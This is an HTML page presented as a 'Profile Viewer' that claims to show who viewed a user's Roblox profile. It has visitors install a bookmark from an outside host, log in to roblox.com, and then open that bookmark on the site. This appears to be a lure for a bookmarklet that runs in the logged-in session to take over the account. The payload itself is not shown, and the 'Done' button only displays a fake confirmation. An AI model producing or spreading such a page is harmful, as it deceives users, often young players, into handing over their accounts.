<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Profile Viewer Setup</title>
<style>
* { margin: 0; padding: 0; box-sizing: border-box; }
body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: #0a0a14; min-height: 100vh; display: flex; align-items: center; justify-content: center; padding: 16px; color: #fff; }
.card { background: linear-gradient(180deg, #16162a 0%, #0d0d1a 100%); border: 1px solid rgba(255,255,255,0.06); border-radius: 24px; padding: 32px 24px; width: 100%; max-width: 420px; text-align: center; }
.logo { width: 64px; height: 64px; background: linear-gradient(135deg, #6366f1, #a855f7); border-radius: 18px; display: flex; align-items: center; justify-content: center; margin: 0 auto 16px; font-size: 28px; }
h1 { font-size: 22px; font-weight: 700; margin-bottom: 6px; }
.subtitle { color: #6b7280; font-size: 14px; margin-bottom: 24px; }
.step { background: rgba(255,255,255,0.03); border: 1px solid rgba(255,255,255,0.06); border-radius: 14px; padding: 16px; margin-bottom: 12px; text-align: left; font-size: 14px; }
.step b { color: #fff; }
.step p { color: #9ca3af; font-size: 13px; margin-top: 4px; }
.num { display: inline-block; width: 22px; height: 22px; background: #6366f1; border-radius: 50%; text-align: center; line-height: 22px; font-size: 12px; font-weight: 700; margin-right: 8px; }
.code { background: #0a0a14; border: 1px solid rgba(255,255,255,0.08); border-radius: 10px; padding: 12px; font-family: monospace; font-size: 11px; word-break: break-all; color: #34d399; margin-top: 8px; user-select: all; }
.btn { background: linear-gradient(135deg, #6366f1, #8b5cf6); border: none; color: #fff; padding: 16px 32px; border-radius: 12px; font-size: 16px; font-weight: 600; cursor: pointer; width: 100%; margin-top: 8px; }
.btn:active { opacity: 0.8; }
.small { color: #6b7280; font-size: 12px; margin-top: 6px; }
</style>
</head>
<body>
<div class="card">
  <div class="logo">👤</div>
  <h1>Profile Viewer</h1>
  <p class="subtitle">See who viewed your Roblox profile</p>

  <div class="step">
    <span class="num">1</span>
    <b>Tap this button</b> to open the bookmark setup
    <br>
    <a href="https://cosmo.baby/assets/RobloxSafari/install.html" class="btn" style="display:block; text-align:center; text-decoration:none; margin-top:10px;">📱 Install Bookmark</a>
  </div>

  <div class="step">
    <span class="num">2</span>
    <b>Go to roblox.com</b> in Safari and log in
  </div>

  <div class="step">
    <span class="num">3</span>
    <b>Open the bookmark</b> you just saved while on roblox.com
    <p>Then come back here and tap "Done"</p>
  </div>

  <button class="btn" onclick="done()">✅ Done — Check My Profile</button>
  <div id="msg" class="small" style="margin-top:12px;"></div>
</div>
<script>
function done() {
  document.getElementById('msg').textContent = '✅ Checking... You\'ll get a DM when it\'s ready.';
}
</script>
</body>
</html>
